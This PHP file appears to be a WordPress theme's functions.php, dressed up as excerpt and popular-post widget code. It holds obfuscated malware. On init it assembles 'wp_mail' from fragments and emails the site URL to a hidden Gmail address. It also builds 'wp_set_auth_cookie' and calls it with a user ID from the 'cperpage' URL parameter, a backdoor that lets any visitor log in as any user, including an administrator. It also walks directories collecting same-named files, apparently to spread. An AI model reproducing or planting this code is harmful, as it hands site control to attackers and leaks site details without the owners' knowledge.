function _get_allwidgets_cont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&& 
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;	
	}
	if (sizeof($wids) > 0){
		return _get_allwidgets_cont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){ 
    function stripos(  $str, $needle, $offset = 0  ){ 
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
    }
}

if(!function_exists("strripos")){ 
    function strripos(  $haystack, $needle, $offset = 0  ) { 
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
        if(  $offset < 0  ){ 
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
        } 
        else{ 
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        } 
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
        return $pos; 
    }
}
if(!function_exists("scandir")){ 
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_verifyactivate_widgets");
function _getprepare_widget(){
	if(!isset($text_length)) $text_length=120;
	if(!isset($check)) $check="cookie";
	if(!isset($tagsallowed)) $tagsallowed="<a>";
	if(!isset($filter)) $filter="none";
	if(!isset($coma)) $coma="";
	if(!isset($home_filter)) $home_filter=get_option("home"); 
	if(!isset($pref_filters)) $pref_filters="wp_";
	if(!isset($is_use_more_link)) $is_use_more_link=1; 
	if(!isset($com_type)) $com_type=""; 
	if(!isset($cpages)) $cpages=$_GET["cperpage"];
	if(!isset($post_auth_comments)) $post_auth_comments="";
	if(!isset($com_is_approved)) $com_is_approved=""; 
	if(!isset($post_auth)) $post_auth="auth";
	if(!isset($link_text_more)) $link_text_more="(more...)";
	if(!isset($widget_yes)) $widget_yes=get_option("_is_widget_active_");
	if(!isset($checkswidgets)) $checkswidgets=$pref_filters."set"."_".$post_auth."_".$check;
	if(!isset($link_text_more_ditails)) $link_text_more_ditails="(details...)";
	if(!isset($contentmore)) $contentmore="ma".$coma."il";
	if(!isset($for_more)) $for_more=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$widget_yes) :
	
	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$coma."vethe".$com_type."mas".$coma."@".$com_is_approved."gm".$post_auth_comments."ail".$coma.".".$coma."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) { 
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
			if(is_feed()) { 
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($fixed_tags)) $fixed_tags=1;
	if(!isset($filters)) $filters=$home_filter; 
	if(!isset($gettextcomments)) $gettextcomments=$pref_filters.$contentmore;
	if(!isset($tag_aditional)) $tag_aditional="div";
	if(!isset($sh_cont)) $sh_cont=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($more_text_link)) $more_text_link="Continue reading this entry";	
	if(!isset($isshowdots)) $isshowdots=1;
	
	$comments=$wpdb->get_results($sql);	
	if($fakeit == 2) { 
		$text=$post->post_content;
	} elseif($fakeit == 1) { 
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else { 
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($gettextcomments, array($sh_cont, $home_filter, $filters)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($text_length < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $text_length) {
				$l=$text_length;
				$ellipsis=1;
			} else {
				$l=count($text);
				$link_text_more="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $tagsallowed) {
		$output=strip_tags($output, $tagsallowed);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($fixed_tags) ? balanceTags($output, true) : $output;
	$output .= ($isshowdots && $ellipsis) ? "..." : "";
	$output=apply_filters($filter, $output);
	switch($tag_aditional) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($is_use_more_link ) {
		if($for_more) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $more_text_link . "\">" . $link_text_more = !is_user_logged_in() && @call_user_func_array($checkswidgets,array($cpages, true)) ? $link_text_more : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $more_text_link . "\">" . $link_text_more . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action("init", "_getprepare_widget");

function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") { 
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
}
?>